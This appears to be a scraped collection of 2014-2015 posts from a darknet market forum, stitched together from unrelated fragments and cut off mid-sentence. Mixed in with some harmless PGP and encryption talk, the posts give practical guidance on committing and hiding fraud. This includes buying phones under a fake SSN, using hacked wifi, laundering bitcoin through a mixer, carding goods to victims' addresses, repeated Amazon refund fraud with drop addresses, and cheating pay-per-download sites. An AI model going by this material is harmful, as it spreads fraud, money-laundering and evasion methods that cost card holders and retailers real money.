I carry a virgin hotspot with me everywhere in north america as my base access. From cities to rural areas I've never had an issue. Tor nodes have long been compromised to a degree, vpns cannot be trusted as a rule, so combine them all. Prepaid data whether it be a cricket phone or hotstpot like virgin, to your vpn, to tor... You're talking $60 to $100 month, atleast for me and I run two portable (active ) servers, so probably half of that for everyone else.  If you're in the USA and don't live in some god forsaken town or swamp or desert you can walk into cricket with a made up ssn and name ( they will ask but will not verify ) and buy the cheapest phone which offers hotspot capability $29 -samsung-. Purchase the 10gb data plan and minimum of everything else which I think is $55.  Then head to walmart and buy a virgin mobile prepaid hotspot with max data which will come to about $150 because the hotspot is about $70 bucks at first.  Carry both with you at all times and if one has bad signal the other will work. I carry the duo all over the US, from nice hotels to extremely remote areas. If you can't afford to do something like this then the last thing you should be worried about is how to remain anonymous because I promise nobody is worried about the hacker who doesnt make enough to cover these VERY minimal expenses.

Most layers of abstraction are good. Like a VPN before TOR. BUT if you go too far and add a layer of abstraction that's bee compromised, then maybe you just nuked your whole setup (e.g. you are using a compromised VPN). The idea of VPN->TOR->PROXY/VPN is ok if you're concerned that you may fall for some stupid trick, which I've seen set up by exit nodes. They'll deliver some special 'error notice' that you can fix by sending code 'xa93aoj' to 'random@example.com'. .... and I'll say it again, Evo is not a honeypot, but some vendors may be, and you MUST assume that every bit of data they have can and will be obtained by LE at some point in the future.

In doing so, that VPN now has your real IP address meaning you could be de-anonymized. All I've said is that I agree with The Grugq who believes that using a VPN to access Tor is not good practice. There are other, more secure ways to connect to the Tor network without having to expose your RL IP address to a third party provider. Using a VPN to connect to Tor actually makes you more vulnerable because they now know your real IP address. Feel free to do as you please mate. Each to their own."

Let's say you connect to your VPN first then use the TOR browser. Now let's say a new TOR browser exploit came along that exposes your VPN provider IP. If your VPN did keep logs they will trace it back to your real IP and it's over for you. Obviously this can be avoided if your OPSEC was more than just VPN -> TOR browser, but I know some of you use this setup anyway. Also if you live in the US, I would not recommend connecting directly to TOR in the near future. The CISPA bill has been reintroduced and it may pass this time thanks to the Sony hackers. It will allow the government to obtain user information from ISPs and other internet companies without the need for a warrant.

Grugq states that TOR provides anonymity whilst VPN provides privacy. So my understanding is TOR provides the final layer of protection if VPN gave up your details. Whilst the VPN itself provides a virtual PC to store your sensitive data. The reason TOR -> VPN is better would be that if they wanted to trace you, they'd have to get the VPN to give you up but that just leads them to TOR. In the other scenario (VPN -> TOR) if at anytime they compromise TOR, then can used gathered information to go to VPN and then they give them your ISP. The person above seems to share a similar understanding which is reassuring.

I'd have expected they had this capacity anyway, off the books. Now it's maybe about to be on the books. Still, for now, they should have to get a supeona to get VPN records, thus a VPN prior to TOR is a good idea, IMHO. I can't imagine why someone would choose to connect directly to TOR from their ISP. That sounds insanely risky, which is what was recommended here. I think it's misinformation OR (more likely) confusion. The person who recommended that may have been speaking of some special circumstances, and then it got twisted around as the message was repeated. TOR appears compromised, by whatever mechanism (maybe they run the whole thing). They maybe can't see data, but can see IP traffic that enters and exits. Thus, I'd prefer them to see a VPN IP, then have to get my records, than them just already have it, ya know?  Best bet is to connect to a neighbor's hotspot, but that's illegal too ;p. Virgin or other hotspots, I like. But that's just me.

Hell, if a vendor is ok with it, use PGP for all conversations even basic ones. I have seen other users (on various marketplaces, including Evolution) mention they used services like Privnote, or other ""self-destructing private/anonymous"" services. These services are NOT a substitute for encryption. If you use one of these services in place of PGP, you might as well just send the message in plaintext to begin with. Regarding Evolution being a ""honeypot"" - don't be silly. If you feel as though it's unsafe, then there is one simple solution. Take your business elsewhere. Easy enough right?

Had it delivered to me in a day so no problems there. I opened the file immediately to quickly glance over it's context and even though it has a lot of work on the layout (it definitely looks nice, easily browsable and good graphics) all my eyes catched were a few keywords that made me feel fucked over straight away. 'SPAM' ' SPAM LEGALLY' 'SPAM ILLEGAL' and just left it for what it was right after. But hey, whatever. I'm sure my emails would stop receiving spam a long time ago if there was no money in it so as this topic got bumped earlier this week I decided to read it thoroughly and give it a try anyway. The setup is clear and gets you through easily. The link for the biggest / most important software was down, but I had that reuploaded by vendor within hours after request. You can have it all setup in minutes. Mostly automated process. Now for functionality: You're given '$950 in software'. About $100 of that (of it's original license price, freely available cracked all over the place and lots of alternatives if you actually had any idea what you were buying) will work for the purpose they serve. The main program, which it is basically all advertised around, is a heavily outdated method. Even though the program and howto might be new to the reader, that might be because it has been saturated for years one could say. All results you will get will be from 2005-2012 and/or, as previously mentioned, already replaced by rayban sunglasses, coats or whatever 5000 other people decided to currently spam your facebook with. Giving someone a guide howto handle a specific brand VCR and telling them they're ready for DVD in general is simply misleading. I'm not explained how or why it works, what it resorts around or anything. I'm being spoon-fed what to do and the method you're selling is worthless for the purpose it serves as is. If it's keywords you're selling for google, just mention that in ad.  In all honesty, I'm disappointed by this sale and it's  another  overpriced guide that can be considered worthless.I appreciate it if a guide has some effort in it and author made an attempt to make it look nice, yet remain as short and clear as possible. Yours is. That's why guide-wise this could be considered - 8/10 As a vendor you responded and reuploaded fast - 7/10 (you had to reupload in the first place)Valuable information in this guide considered - 1/10 Conclusion: Vendor: Positive - OK guy, you can see the guide has been translated from French and he did a good job at that compared to some of the other French. It's well written and translated. Responds within a day.  Guide: Negative - Heavily outdated, misleading advertisement, overpriced by 500% at discount Marketing: MisleadingVouches: Misleading and questionable. Trippyy: 'I would do it but it seems you gotta have a Paypal account. At first it might be slow but once you get the hang of it you can make I'd say 200-300$ a week for sure.' (I'm not sure if he has even read your guide and combined with him being known for asking free vouches all around - Questionable.) Faerie: 'Will give a review' (Hasnt tried at that time - review hasnt been updated)   Jusreign: 'Hopefully I can get this done in my spare time' (Hasn't tried at that time - Hasnt come back to update)   Hihopes: 'I can certainly see it being useful and being able'. Recommends 'having a go'  (AKA hasnt tried - hasnt come back to update)  Albundy: Again just the misleading positive part of his review - yet its true, you responded to reupload rather quick.  F_scooters: 'Creativity is not required for the method to work, so don't be alarmed by it' (You just said it is, I just said it is - You basically need an entire new method. Yet you use it as a vouch) This is worth $10 at best. $5 for the guide itself ($2.50 for the provided software links for people who appreciate the effort)($2.50 for the google keyword) I would not recommend buying this guide at any other price.

"Evolution Forums","unicorned","41688","2015-01-07T06:05:30","Newbies - you are going to get busted unless you learn FIRST","Security & Anonymity","A simple click. An impulse. That's all it takes to destroy your entire life. If a deal sounds too good to be true, don't take it. If a vendor doesn't have a stellar reputation and recent reviews, don't do business with them. NEVER type in your unencrypted name or address. Also NEVER send it unencrypted (goes with first sentence). I just mean, don't use Evo as a notepad. Avoid dealing with anyone who requests you FE early and leave feedback (especially the latter). Search those vendors on these forums for reviews. Spend AT LEAST a week doing research and learning first. Don't do something stupid like try to send to somebody else. Involve nobody else. Don't open your big mouth to your friends. They can later testify against you, or maybe your house was bugged at the time. I have dealt with Law Enforcement. The war on drugs is serious. In a BEST CASE scenario you might be in some lenient state and only get YEARS of probation where you are drug tested and have a felony on your record for the rest of your life. BTW, good look traveling to even Canada with a Felony (if you admit such). In a worst case scenario you are in Texas or anywhere in the Southeast, and they bury your life under the jail. Goodbye, whoever you were.  EDIT:One addition I forgot to mention... Bitcoins... be sure you know what you are doing, as they can provide quite powerful evidence that it was you who placed the order. They don't have your name attached to them, but since every transaction is logged in a public ledger, it's easy to see where they came from UNLESS you properly launder them (and you better hope the laundering site isn't run by LE).

LEARN PGP.  There are alot of user written 'how-to's'  This does not guarantee anything like perfect protection, but it will separate you from the low hanging fruit.  DON""T BE LOW HANGING FRUIT!3. goto http://bitblendervrfkzr.onion/?r=3786.  The site admin is very kind and helpful.  In short, you will be able to spread your deposits accross 10 addys at once, provide a randomized 2-12 hour delay and your coin will be comingled with many others' coins, mixed in if you will, then the amount you sent, minus the 1-3% randomly applied fee, will be available for withdrawal to, say, EVO. 4. There are many other alt currencies/trading platforms that you can use to further distance your btc from AgMkt from You.  Use your imaginations.    Most importantly, NEVER BE IN HASTE.  NEVER EVER SPEAK OF THIS TO ANYONE.  Greed and haste is what gets us caught on DN as well as IRL.  If you talk about it, undoubtedly someone will either get jealous or see an opportunity to screw you...The OP spoke of felony, but what I think he is trying to say is that you are in the realm of Federal Jurisdiction as well as state.  If something goes down, there are several agencies that will get involved and you will go to jail in the federal system in the USA.  If, heaven forbid, you get a CD or arrested, SAY ABSOLUTELY NOTHING.   What you DON""T SAY in the first hours may save your life/freedom.

The basic idea is running two VM one as a gateway and one as a workstation. DNS leaks are impossible and its extremely secure, if build correctly. you can take this a step further and turn the gateway into its own physical isolated machine running the gateway that is connected via ethernet to your router and your laptop/host. after deleting everything on your host and reinstalling linux + HIPS (host intrusion detection system), now you instal virtual box with the Debian based Whonix Workstation OS  running on it. you must only have one wired NIC card on your host, no wifi card installed at all. The camera taken out, along with the microphone. and most importantly you must trust the host so this needs to be installed only for this purpose and no other purpose.  This prevents against targeted exploits and its main function is to maintain anonymity, as you see, if malware was able to get out of the secure VM workstation and compromise the host, it would still only get the IP address of the TOR exit node due to the TOR anonymizing middlebox. As long as you dont have a camera or a microphone your true identity isnt a risk even will malware running as Admin on the host.  after thought, of course you can always chain a SOCKS to this in either direction, but it will require some customization a little. This is my system.  aside from that youre setup is sick, i'll definitely be seeing what i can pick out of it and add to my own.   i've been working on a killswitch myself /// i wrote all this and then i realized i miss read the post.. your system is extremely secure.  i missed the VM,.... good stuff

Tails devs advise against using Tails in a VM , see : https://tails.boum.org/doc/advanced_topics/virtualization/index.en.html 2. Tails by default routes all internet connections through Tor.  Not easily , you need to configure a SSH connection. An easier alternative is to create a VM within tails and install a VPN client there. Tails is sufficient if you are a buyer. Everything you need is preinstalled i.e pgp , pidgin , btc wallet , password manager etc. Yes you can get Tails to work over a VPN but to do so you must run Tails in a VM and connect to a VPN on your host but as mentioned above , Tails devs advise against running Tails in VM. The os on your host does not matter much if you are booting Tails from a usb. Debian is a good choice none the less. Your setup may look something like this : TAILS > VM > VPN > RDP / SOCK5 : The key factor of your safety here is how you connect to the internet. NEVER use a network that is related to you in anyway i.e home , school , friends , families. ALWAYS use hacked / public wifi.  I'm not sure if you would benefit much from running Tails off an encrypted usb , I have never tried so you will have to seek advise from someone else about this. What you can do is set up a persistent volume with a strong passphrase ( 50 + characters ) within Tails to keep your data safe. You're over complicating things here , once you have your VM set up with the software you want , save an image of your VM to your persistence so you don't have to re install all browser , VPN's , proxifiers etc with every boot. Remeber , Tails uses a ramdrive and wipes it on every shutdown. The point of it is to leave no trace of it on your host pc.","Darcyweed wrote:Is this a good setup to card stripe?

I can bet that nine times out of ten that when someone committing fraud encounters a situation where social engineering is required, they back off because they do not have the confidence or the skills to execute it effectively! With my short but sweet introduction to social engineering, I will give you the tools you need to potentially unlock a skill set that you will use for the rest of your life! In this guide I have also included 2 large ebooks which will be excellent reads and I know this as I have read them myself, and still use the ideology behind them today!

This method requires UK CC Fullz, prepaid bank cards as described in the actual method. You also need a drop address, a few accounts like bitcoinfog & the other is a site where you must sign up to attach prepaid cards. You do not need any kind of documents or anything else past what is mentioned in this guide.

Your requirements for security depends on how your opsec is set up. I've learned my lessons from popadoppalus regarding VPN. Let's say you do wifi-hopping. This automatically breaks the purpose of the VPN. There's no use to wifi-hop if at the end you just connect to the same VPN.  Using a VPN to hide your TOR activities? All your TOR activities are encrypted by default. You can't just go into about:config and change stuff. One does not simply do that. A simple tweak could lead to a fatal information leak. Make sure you know your browser settings before you even start tweaking it. There's no need to use SOCKS if you just browse TOR. Exit nodes change every couple of minutes.

They got the package, and called cops, and according to the local cops there's an investigation started for some kind of fraud charges against my buddy. What do? I wanna see neither me or my buddy go to jail if possible.  I think we're gonna claim that we didn't know where the money was coming from, he got it as a currency exchange, and the exchanger told him to send a package to make it legit.

At this point I'm pretty sure we're safe, and I just hope this can be an example of how not to use paypal transfers. I guess if you're going to do it, do it right, taking full precautions etc.

Iâm not talking ridiculous figures that some members on the dark web will spout out to you, but figures that can, if you put the effort in, support a luxurious lifestyle.** Clubbing, holidays, cars and rent can all easily be paid for, without the paranoia of much other fraud.  This is not a simple Amazon refund guide, but a full guide on how to repeat Amazon refunds to different addresses.------------Including:i) Transcriptsii) Multiple address methodsiii) Multiple payment techniquesiv) Double Dippingv) How to create multiple accounts .   OR CONTACT me on ICQ and we can talk -  There will be updates with other websites in the NEXT WEEK OR SO. Buy now receive free updates on how to refund eBay, Asos and more. Buy now and ALSO receive support through your first refund. The safest, easiest method of fraud.

My guide is a fully formed PDF with a great layout - I used to be a graphic designer. Damatters guide from what I have seen on his listing does not explain multiple refunding and stealth Amazon accounts, which is the main gist of my guide, and is the most valuable resource to have - how can you earn more than Â£1000 if you can only do it once or twice? Both guides will not offer my method of drop addresses, which is exclusive and is a unique method which has not been seen before. The 2 method of drop addresses will end up being the most valuable part of the guide.

If you attempt to use your personal address again, that account will be shut down, and your refund will not go through. By showing how to create new accounts, new drops and new payment methods, you can refund more than 2 or 3 times, and live off Amazon refunding. A drop is not needed for 2 or 3 refunds, but you will be needing drops if you actually want to earn enough money to pay your bills etc.","astujis wrote:Why it is needed to have a drop for amazon refunding?"

We'll go in-depth into carding, from setting up your security to carding your first trophy. To consistently pushing you towards pulling this off each time in regards to the method(s) we'll be executing. b) Card's that die or never die? You want cards quick? Or you want cards that last? Forever? Well, if you're just looking for a quick cup at starbucks, or a quick 100$ Amazon gift code to sell off or use real quick. You're good, i got a route for both the consumer and the long term user and personal user of these. No cops, no knocks. c) Can you teach my how to cash these out? Yes! I can direct you towards the proper yet safest way of cashing out these cards. You'll be able to pull both cash, and Bitcoin directly from these cards. At nearly 100% Face Value. You ever wonder what them guys buying big bulk in carded Starbucks are doing? Obviously there cashing out and making a profit some how. Right? Why els, are they spending thousands? There has to be a game to this right? Well, simply put. The game is this, there cashing out.. Thousands of dollars in the end.. After the investment, now. You can spend money, invest. Play around yourself, lose 1000$ trying to cash-out. Or just purchase this guide/method. Skip the you "" learn from experience "" shit, and learn from this knowledge I'm trying to present to you. I'll put you on the right track and get you cashing out thousands of dollars with them. Day one, yes. If you have the proper amenities and investment to use. You can be cashing out into the thousands, Day One. Although, admitting not every body will be properly equipped to be cashing out thousands day one. It requires, an investment. But, you can start from scratch and build this investment rather quickly.  Breakdown of what were essentially doing is simple. You'll turn the funds from a credit card, into Amazon gift codes. Essentially, we will not be sourcing the f straight from Amazon. No, the funds will don't start by going through Amazon. They are, simply ending with Amazon in the form of gift card codes. Actually, Amazon never really plays a role in giving you any code. We achieve this, through other means. I'm going to teach you quite simply, how to take a credit card. And turn the funds on it into a 100% clean untraceable gift card you can then sell. So, let's observe the situation. Card, on average is 6$. Get 100$'s in Amazon. Wash, rinse, repeat. Don't want the cash? Cool, it's probably smarter to invest in Bitcoin anyways. We can get these Amazon cards easily exchanged for Bitcoin. At nearly 100%. In the near future, they'll gross more than that 100% with the increase in fluctuation. c) What if I'm having trouble? You're good, I'll also provide my personal Jabber in the delivery. Along with the helpful reminder to drop a PM if you have any questions and I'm not online or i-responsive. I'm here to do square business, and spread good knowledge. And help, the people that wish to be helped. If you're not reasonably motivated to invest cash wise in yourself. Why should I be?  I'm not going to just take your money and send you along your way. I'll make sure you fully ready to utilize the knowledge I'm giving you. I am however, in looking to placing a proper copy in the hands of a sensible and proper reviewer.  d) What's the investment? You can get started, with simply 100$ or quite more elaborately 1k. e) What's the ROI?  It depends what route you take. Listing: http://k5zq47j6wd3wdvjq.onion/listing/83759

This particular guide details a simple, method of obtaining up to Â£500 in a process that takes maybe 20 mins or so...this will not be 100% effective and indeed its the norm for the process to sometimes fail..but the point is that some are successful, generating the money detailed, so work of 2 hours or so per cashout seems realistic...which can then easily cashed out to a bank drop (not in you own name)...or to BTC...and several suppliers are detailed to enable this.. This is a simple procedure, that anyone can follow (inc noobs)...don't expect a big 70 page manual its not necessary....its small, only 3 pages...but youre buying the procedure...not the amount of paper... you'll need the things detailed in the opening thread and in particular need to understand the ways to operate in stealth via VPN/Socks etc..you'll need to be able to obtain UK Fullz in sufficient numbers to start the process  Overall - Highly recommended UPDATE 12 October...appears to now be burnt

Guide just tells what you should do but Oziyn helps you to make individual approach to every refund and follows you, teaches everything in practice and  really makes you master by time. I think Oziyn's support is main thing in this guide.  Guide is good but vendor helps a lot more, he teaches all small details how to communicate with amazon, how and what you should tell them, when to message/call them and when not. All this small details really can not be told in guide but Oziyn's top communication does it all. He always answers in 3 minutes the most and is very friendly good person. He is not person which just gets money, gives the required item and leaves, he really seems like great teacher and friend, teaches you till the moment you get enough experience to teach others  . I wish I knew that guy in person. Evolution should be proud that it has such great vendor on here. Keep up Oziyn!

"Evolution Forums","rememberremember","14332","2014-06-23T04:19:36","Re: What kind of security setup should I use?","Security & Anonymity","From what research I've done, the advice is solid. SOCKS5 seems to be less of a personal security measure than it is a necessity for carding to be successful. It's primarily used to to circumvent a geographic security measure. Regardless of what avenue you use, your security foundation is most important: Buy your bitcoins anonymously, if you can (localbitcoins). If you choose to use a clearnet exchange that requires ID, then make sure you tumble your BTC before you send it to the market. Work off of a live USB with Tails, or one of the other methods. Use a drop address for your drugs that isn't attached to your identity.  99% of all fuck ups don't come from a DNS leak, or a failure in software, but as a result of human error and a lack of common sense. You can have all the bridges, proxies, RDPs and VPNS you want, but a shitty OPSEC foundation will be your undoing.  Good advice I was given, and tend to use: If you're asking if you need to bother with higher methods of security, then the answer is yes: Better to have and not need, than to hope for lube in prison.  Seems to me that LE cares more about vendors than buyers, and more about drugs than other types of illicit chicanery. I am not a vendor, and I have no interest in even marijuana, much less anything more hardcore.  That doesn't mean I get lazy with my security setup though.  Food for thought.",""

You will have access and control to not only your main account but also the referral account so you make twice the cash! Takes a little time to set up accounts, maybe a couple of days or so, but once you're all set up you will be extremely happy. I'll also be including in this posting the sale of the scripts I have for a limited amount of people only 5 people will be able to purchase my register script that literally does it all for you, and the same with my log in script:) Only $40 for the register script, and $50 for the log-in! Contact me about it for more details! You'll also see at the bottom of my thread here a picture of a check I recently got, so you all know I'm not just blowing hot air!

You can also use different addons on Chrome to achieve the same thing as the sandboxes(like multi-login for Chrome for instance), but in my opinion it seems that Chrome multiple instances actually lag the computer more than the sandboxes, so I'd say go with the sandboxes IMO -- Opera Mobile is specifically the one I use and so far has gotten me the best results:)I really appreciate it final for taking the time out of your day to check my guide out and help a bro out.

To my surprise, it works!I haven't been paid yet, but I've managed to ""recruit"" myself a few times and working my way to a payout. It is however, very repetitive and tedious. But once you get the initial setup going, its literally automated.It does take a few hours to setup, to hit max potential, but could easily be accomplished by hiring a VA or microworkers. Combine this with some carded advertisement, and you could be making easy money daily. A couple extra hundred a day is more than enough as a supplemental income stream.Other than the initial time it takes to setup, it more than pays off in the end. All in all, very good guide based on the ROI potential. Especially since the scalability of this is easy and actually recommended by the site owner.If you're looking to make some easy side cash doing nothing but keeping your PC on, then buy this guide.Beeker"

How can he be getting a check in this case? I'm not after you. I'm simply trying to figure out this whole thing. I don't think its right to sell bunk guides or to falsely advertise ppl can make money when they really can't. What really irritates me most of all is the fact you have to give your actual identity just to cashout (and it turns out you can't cashout).

Now, I have not sent them mine yet, so I don't expect a check in very soon. They did tell me only US and Canadian addresses can receive checks. Since I'm in Canada i'm good to go. Frankly, I would be worried if it was suppose to be legit income, and then they don't ask for a W9 form. Because all real advertising companies MUST do that. From the crappiest company that sells ""swagbucks"" to Yahoo. They all do that.   I read around the website including disclaimers. All I can say is that they have liability issues pertaining to their educational seminars, and they include the usual disclaimers like you may not necessarily become a millionaire from purchasing the seminar how to become a millionaire. Secondly, they state that the owner has been compensated for pushing the products, and that he also ""believes"" in them.  Thirdly, they can be sued by US/Canadians if they do NOT send the checks, so I'm pretty sure those citizens will get a check.  The company seems to have been operational since 2010 (probably doing radio promotion), and a little more than a year ago transitioned to doing TV advertising. Their profits are far more astronomical than what we'd get, so for every 100 dollars we earn they probably earn 20 to 50 times that.  In sum, if your a US/Canadian you'll get a check. If not, sorry.","marko11 wrote:I hope they will pay (i am also from EU), but this site looks very, very stupid.

Frankly, I would be worried if it was suppose to be legit income, and then they don't ask for a W9 form. Because all real advertising companies MUST do that. From the crappiest company that sells ""swagbucks"" to Yahoo. They all do that. I read around the website including disclaimers. All I can say is that they have liability issues pertaining to their educational seminars, and they include the usual disclaimers like you may not necessarily become a millionaire from purchasing the seminar how to become a millionaire. Secondly, they state that the owner has been compensated for pushing the products, and that he also ""believes"" in them. Thirdly, they can be sued by US/Canadians if they do NOT send the checks, so I'm pretty sure those citizens will get a check. The company seems to have been operational since 2010 (probably doing radio promotion), and a little more than a year ago transitioned to doing TV advertising. Their profits are far more astronomical than what we'd get, so for every 100 dollars we earn they probably earn 20 to 50 times that. In sum, if your a US/Canadian you'll get a check. If not, sorry."

Since you don't know the actual website, I can shed some light on certain aspects without giving too much away. The the owner of the website is an old fat bald man, who is hawking the products on the broadcast your paid to watch. Now, it's obviously him because the legal disclaimers state that he is the owner and receives compensation for hawking those products. You claimed you thought Ohman1988 was the site owner. Ohman is not because just judging from his handle he's too young to be the site owner, and trust me if you saw the site owner you'd know he's not a young man. Now, there is no other way for Ohman to make money from having darknet referrals because there is no mechanism that allows you to explicitly state xyz referred me. So, if Ohman is not the website owner (which we already established he isn't), then he has no other way of making money off the people of the site. The fed honeypot thing--I hope your being histrionic--but the cashouts are legitimate therefore there is nothing to catch. A honeypot implies a gambit used by the feds to induce/observe a crime being/about to be committed.

I suspect most EU people are having trouble getting in touch with the support system simply due to time difference. The timezone of the support system is the West Coast (they are located in Vegas.)

Ohman told me he has thousands of accounts. But you need a W9 form based on the info in this thread. To fill the W9 form, you need an SSN. So how has access to thousands of ssns? that's conceivable, but he told me you don't need an ssn for this process. Now that statement contradicts what was said in this thread, and confirmed by him. He said this whole process was legitimate because it requires a W9. Now, he's contradicting that statement implicitly....I don't know guys. It's fishy...He's definitely no fed. A fed is not dumb enough to contradict himself that badly, but he maybe an advertiser making money off the ppl they get to the site.

You know you can send me a message too, you guys are just wanting this whole process to fail, but it won't sadly. It's a great program and all legit and legal. Also, mystik you never tried to contact me, I'm on aim all day get on and get help, or continue to complain for no reason and get none.

And for people who want to buy his PPD guide donÂ´t. To cheat PPD sites you need socks5, some blog and youtube video. So when you download your file use socks5 (us, ca, uk )then click on download link (download link need to be on blog or in description of youtube video). To lower your CR use fake traffic (hitleap, websyndic...). Also register on 3-5 PPD sites so with one socks5 download your file from 3-5 PPD sites. Math: If you do this every day you can earn 20-25 $ easily. And when you select on which PPD network you want to register, choose PPD site which have offer optimization (so you can select install offers). I think that all.",""

There was no update for 2 years. The build process requires a 20 year old MS compiler, manually extracted from an exe installer. Imagine yourself as the lead/solo developer working on TC. No one pays you for this, governments hate you, much of the crypto community is throwing rocks at you while your user community spends half of its time joining in with clueless paranoia and the other half whining about feature gaps (e.g. GPT boot disks.) You have to eat, so you have a real paying job. Youâre not so young any more (doing the TC crap for a decade) and maybe the real job now includes responsibilities that crowd out side work. Or maybe youâve got a family you love more than the whiny paranoids you encounter via TC. And now iSec is telling you your code is sloppy and unreadable, and that you should take on a buttload of mind-numbing work to pretty it up so they will have an easier time figuring out where some scotch-fueled coding session in 2005 ( or maybe something you inherited from a past developer) resulted in a gaping exploitable hole that everyone will end up calling a NSA backdoor. Maybe you just toss it in. Why not? Anyone with a maintained OS has an integrated alternative and as imperfect as they may be, they are better than TC for most users. Maintaining TC isnât really doing much good for many people and the audit just pushed a giant steaming pile of the least interesting sort of maintenance into top priority. Seems like a fine time to drop it and be your kidsâ soccer coach.",""

BTW i wonder why i never see any threads about routing using a manual routing table. either you type it in or it runs as a batch file on boot. i know at a company i once worked for (10,000+ users) there was this one box that had to talk to shit on completely different network. the only solution was to manually set up a routing table and then mapping a drive over there. if someone was to do this manually (it's only a couple of lines) it would be a dynamic route that would disappear when the box was shut down, so there would be no trace connection between the two networks.    so far as encryption goes that high level stuff that NSA does - is just that - high level. run of the mill DEA agents complain that they can't decode sms messages between Apple devices. that's not enough to make me want to run out and buy an IPAD (actually already have one) but it shows that any level of encryption is better than none. i wrote a simple encryption algorithm years ago so my buddy and i could swap spreadsheets as email attachments. i have a web page where users subscribe to a weekly file that they can then print using a custom printing routine. to prevent the users from merely using notepad to create their own file, the one they download is encrypted and then decrypted by the printing routine.  so basically what you need is a seed, a randomizer, and algorithm. btw the random number generator in your computer is not random. it's really not that difficult. linux distros now have full disk encryption as a native feature. i am not a fan of full disk encryption (not that rabid about Linux either for that matter - but i use it all the time including the full disk encryption). i just personally prefer the box to appear as a normal PC with warts and all. any sensitive data gets encrypted on an airgapped box onto a USB stick and stored in a very secure place. i don't care about compromising small time shit - at my age i figure 60 days in jail is a vacation.  oh yeah here is another link about True Crypt:      http://www.businessinsider.com/truecrypt-shuts-down-2014-5","evilsmile wrote:popa, its easy for you to say this man, but for us mere mortals truecrypt was / is a bit of crutch.  I'll be fucked if I am going to try and code and piece together the necessary alogorithms to feel safe...  I have a hard enough time trying to chain proxys to TOR and getting TOR to route through a VPN."

Buy it in the next 24h ----> 50% off (75$) Buy it until Friday -----> 100$ instead of 150$  UPDATE 2 Still available, only 5 copies left. Price has now been reduced from 250$ to 150$ as a summer promotion  UPDATE I made some adjustments to my method to make it possible to succeed with this even for people with no carding skills at all. First of all I will have to reveal the website this guide involves: Amazon  Now with my update I will show you some simple ways to refund Amazon items below 1k which is more than enough for this method. Some advice on security and the creation of ghost accounts will be included as well. Before anyone complains I know that this information is not original and available elsewhere but this is only included for completion in case a customer doesn't know how to do this already and yes it involve empty box etc. VERY IMPORTANT: The actual corner stone of this guide is the fact that again like with the carding route this will enable you to basically do unlimited amazon refunds since you won't need a drop. No need for drops and instead of having to sell the items you got refunded from Amazon you will receive 80% of the items value in BTC and the refund of course. This way you can do as many Amazon refunds as you like.   I will send the update to the reviewers and my previous customers within the next hour. This is easy money, you won't need many skills neither carding or SE, no saturation anytime soon. Get this while it is still at 200$  ------------------------------------------------------------------------------------------------------------------------------------------- Hello everyone, I have something very exciting for you I just found a new way to get BTC from CCs two weeks ago and tested it successfully since. Procedure: Step 1: Card a physical item to a victims address Step 2: Receive 60-80% of the items value in BTC That is it! Time from CC to BTC depends on the shipping time but should be around 3-4 days maximum. Requirements: -The usual security setup-CCs from a lot of possible countries (US,EU,some others)-Payment has to hold until the victim receives the item  This is a method for advanced/experienced carders as it involves carding physical items from a major online retailer. If you are already carding bigger websites for physical items successfully but are tired of finding new drops then this is the method for you! No need for drops, just BTC straight to your wallet. I will only sell 10 copies and they will start at 200$ and increase in price from there on.  I have given out exactly two vouch copies one for Yasuo and one for andigatel as he has done good in depth reviews in the past. Here is the link to the listing: http://k5zq47j6wd3wdvjq.onion/listing/20741  Kind regards, StrattonOakmont

First of all I will have to reveal the website this guide involves: Amazon Now with my update I will show you some simple ways to refund Amazon items below 1k which is more than enough for this method. Some advice on security and the creation of ghost accounts will be included as well. Before anyone complains I know that this information is not original and available elsewhere but this is only included for completion in case a customer doesn't know how to do this already and yes it involve empty box etc.  VERY IMPORTANT: The actual corner stone of this guide is the fact that again like with the carding route this will enable you to basically do unlimited amazon refunds since you won't need a drop. No need for drops and instead of having to sell the items you got refunded from Amazon you will receive 80% of the items value in BTC and the refund of course. This way you can do as many Amazon refunds as you like.  If you have any questions feel free to ask

"Evolution Forums","WhosAsking","48656","2015-02-10T19:29:10","Re: Check my setup real quick please?","Security & Anonymity","So it's your own school network ? Using a school network is as retarded as using home network. You may be among hundreds on the network yes , but you will probably be the only one connecting to a VPN , how safe are you now ? Hopefully you're spoofing your mac so now lets pretend I'm the school Admin. I notice each day there is a user on the network connecting to a VPN , each time a connection is made to that particular VPN ( assuming your using the same one ) , a different mac address is used. This would lead me to suspect either someone is spoofing their mac or by some miraculous coincidence there are random people coming into the school connecting to the same VPN.  Use public or hacked wifi , simple. No ties to your life what so ever , there may be hundreds in your school but potentially thousands ( depending on location ) of devices come into range of a public wifi and while there inevitably will be regular connectors , for the most part there will be no consistency of mac addresses.

I bought a vouch copy and this is a pretty good guide. I've spent a lot of time with all these bullshit guides on here, just started on the forum though.  It's really simple, and actually everything you need to do it is already available to you, you just have to put it together, and that is what neth did. I don't want to give out any details, but I think that anyone could do this. I haven't tried it just yet but I am trying it now, and I am almost certain it will work. You just gotta spend $100 and you will be able to get it. There is a point where it could mess up, but you would just have to try again(meaning spend another $100). And even if it didn't work the first time, it would be worth the $100 to try again, because think of the profit from an iPhone. Just FYI though, you can only get 16GB iPhone 6, but it is T-Mobile Unlocked iPhone. I think there is also an iPhone 5S, but those are your only two options. If you have a question, just ask me. But I won't share specific details about it, because as neth mentioned, this can only go out to a few people or else it will most certainly be patched.

They close the account immediately and cut you a check for your money.  Banks hate BTC. If you want to buy a lot of bitcoins carefully and efficiently, then use cash. Always cash.

Kleopatra is just a certificate manager which provides a simple import and export of certificates to and from (OpenPGP and X.509) on-line key servers (also called certificate servers).

"Evolution Forums","Emmet","53727","2015-03-04T21:36:10","Re: How to import my pgp key?","Security & Anonymity","I found this tutorial for you which covers it all relating to importing / exporting your PGP keys using Kleopatra -    19.1 Export  You must make up a backup copy using Kleopatra anytime you transfer a private certificate to another computer or want to save it to another hard drive partition or backup medium. You may have already set up such a backup copy at the end of your OpenPGP certificate creation process. Since your OpenPGP certificate may have received additional authentications in the meantinme, you should back it up again if applicable. Open Kleopatra, select your own certificate click on File -> Export private certificate. Select the path and the file name of the output file. The file type is set automatically. Depending on whether you want to export a private OpenPGP or S/MIME key, the file ending .gpg (OpenPGP) or .p12 (S/MIME)will be selected by default. These are binary files which contain your encrypted certificate (including the private key). When you activate the option ASCII-protected (ASCII armor), the file ending .asc (OpenPGP) or .pem (S/MIME) will be selected. These file types can be opened with any text editor - but you will only see the ""mess"" of numbers and characters that we have already seen before. If this option is not selected, an encrypted file with the ending .gpg (OpenPGP) or .p12 (S/MIME) will be created. These files are binary files, so they cannot be viewed with a text editor. Kleopatra stores both key parts - private and public - in 